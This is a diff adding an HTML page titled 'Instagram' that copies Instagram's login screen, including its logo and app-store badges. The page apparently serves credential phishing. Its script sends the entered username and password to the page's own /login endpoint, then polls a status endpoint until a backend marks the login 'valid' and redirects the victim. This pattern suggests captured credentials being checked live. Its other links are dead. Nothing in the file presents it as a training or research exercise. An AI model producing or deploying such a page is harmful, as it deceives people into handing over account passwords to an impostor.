@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="/loadcss">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+  <style>
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255, 255, 255, 0.8);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .loading-spinner {
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+  <script>
+    function sendLogin(event) {
+      event.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      if (!username || !password) {
+        alert('Please enter both username and password.');
+        return;
+      }
+
+      document.getElementById('loading-overlay').style.display = 'flex';
+
+      axios.post('/login', { username, password })
+        .then(response => {
+          console.log('Login response:', response.data);
+          if (response.data.message === 'pending') {
+            checkLoginStatus(response.data.loginId);
+          } else {
+            document.getElementById('loading-overlay').style.display = 'none';
+            alert('Unexpected response. Please try again.');
+          }
+        })
+        .catch(error => {
+          document.getElementById('loading-overlay').style.display = 'none';
+          console.error('Error sending login:', error);
+          alert('Error processing login. Please try again.');
+        });
+    }
+
+    function checkLoginStatus(loginId) {
+      console.log('Checking login status for ID:', loginId);
+      axios.get(`/check-login-status/${loginId}`)
+        .then(response => {
+          console.log('Status check response:', response.data);
+          if (response.data.message === 'pending') {
+            setTimeout(() => checkLoginStatus(loginId), 2000); // Check again after 2 seconds
+          } else {
+            document.getElementById('loading-overlay').style.display = 'none';
+            if (response.data.message === 'valid') {
+              window.location.href = response.data.redirect;
+            } else {
+              document.getElementById("msgDisplay").innerHTML = "Invalid username or password";
+              document.getElementById("msgDisplay").style.color = "red";
+            }
+          }
+        })
+        .catch(error => {
+          document.getElementById('loading-overlay').style.display = 'none';
+          console.error('Error checking login status:', error);
+          alert('Error checking login status. Please try again.');
+        });
+    }
+  </script>
+  <title>Instagram</title>
+</head>
+
+<body>
+  <div id="loading-overlay" class="loading-overlay">
+    <div class="loading-spinner"></div>
+  </div>
+  <main class="l-main">
+    <div class="l-main__img">
+      <img src="/login page/assets/img/homepage.png" alt="Smartphones">
+    </div>
+    <div class="l-user">
+      <div class="c-panel group">
+        <img class="c-panel__img" src="/login page/assets/img/instagram.svg" alt="Instagram">
+        <form class="c-panel__form" onsubmit="sendLogin(event)">
+          <input type="text" class="c-panel__input" placeholder="Phone number, username, or email" id="username" name="username">
+          <input type="password" class="c-panel__input" placeholder="Password" id="password" name="password">
+          <input class="c-btn" id="loginform" type="submit" value="Log In">
+          <span class="c-panel__span">OR</span>
+        </form>
+        <div id="msgDisplay"> </div>
+        <a href="#" class="c-panel__facebook">Login with Facebook</a>
+        <a href="#" class="c-panel__forgot">Forgot password?</a>
+      </div>
+      <div class="c-signup group">
+        <p>Don't have an account? <span>Sign up</span></p>
+      </div>
+      <div class="c-app">
+        <p>Get the app.</p>
+        <div class="c-app__download">
+          <img src="/login page/assets/img/apple.png" alt="Apple Store">
+          <img src="/login page/assets/img/google.png" alt="Google Play">
+        </div>
+      </div>
+    </div>
+  </main>
+</body>
+
+</html>
